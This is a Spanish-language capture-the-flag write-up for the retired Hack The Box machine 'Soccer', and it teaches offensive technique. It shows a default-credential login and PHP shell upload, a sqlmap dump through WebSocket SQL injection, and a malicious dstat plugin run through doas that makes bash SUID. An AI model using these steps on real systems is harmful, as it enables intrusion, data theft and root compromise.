---
machine: Soccer
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / SQLi en WebSocket
state: Retired
tags: [tiny-file-manager, cve-2021-45010, websocket, sqli, doas, dstat]
---

# Soccer — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

`/tiny` expone **Tiny File Manager 2.4.3** con las credenciales de fábrica (`admin:admin@123`). Su subida sin restricciones (**CVE-2021-45010**) deja un shell PHP en `uploads/` → `www-data`. La config de nginx revela otro host, `soc-player.soccer.htb`, con un **WebSocket** en 9091 vulnerable a **SQLi ciega**; de la base salen credenciales SSH de `player`. Y `doas` permite `dstat` como root: un plugin de Python da root.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
# 22 ssh, 80 http (nginx), 9091 (Express/WebSocket)
ffuf -u http://soccer.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
# tiny
```

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

1. **Tiny File Manager 2.4.3** en `http://soccer.htb/tiny/` con `admin:admin@123` (credenciales por defecto publicadas en su repo).
2. **Subida de PHP** en `tiny/uploads/` con el shell de siempre; visitarlo da `www-data`.
3. **Segundo vhost**: en `/etc/nginx/sites-enabled/` aparece `soc-player.soccer.htb` y su servicio en el 9091.
4. **SQLi por WebSocket**: el cliente envía `{"id": "<ticket>"}`; con `sqlmap` sobre `ws://`:

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id":"*"}' --batch -D soccer_db --dump
```

5. **SSH** con las credenciales recuperadas de `player`.

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

```bash
cat /usr/local/etc/doas.conf
```

```text
permit nopass player as root cmd /usr/bin/dstat
```

`dstat` carga plugins de Python; como se ejecuta como root, busca en `/usr/local/share/dstat/`:

```bash
mkdir -p /usr/local/share/dstat
cat > /usr/local/share/dstat/dstat_evil.py <<'EOF'
import os
os.system("chmod +s /bin/bash")
EOF
doas -u root /usr/bin/dstat --evil
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **`sqlmap` y WebSocket**: hace falta `websocket-client`; el `*` marca el punto de inyección en el JSON.
- **Hosts**: `soccer.htb` y `soc-player.soccer.htb` en `/etc/hosts`.
- **Ruta del plugin**: `~/.dstat` no sirve porque root no lee el home de `player`.

- Credenciales de fábrica más subida sin restricciones es RCE directo.
- Los ficheros de configuración de nginx enumeran hosts internos.
- SQLi no siempre viaja por HTTP: WebSocket también.
- `doas`/`sudo` sobre herramientas con plugins es ejecución de código como root.

## Mitigaciones y detección

- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
- Consultas parametrizadas y permisos mínimos para la cuenta de base de datos.

## Referencias

- [CVE-2021-45010](https://nvd.nist.gov/vuln/detail/CVE-2021-45010)
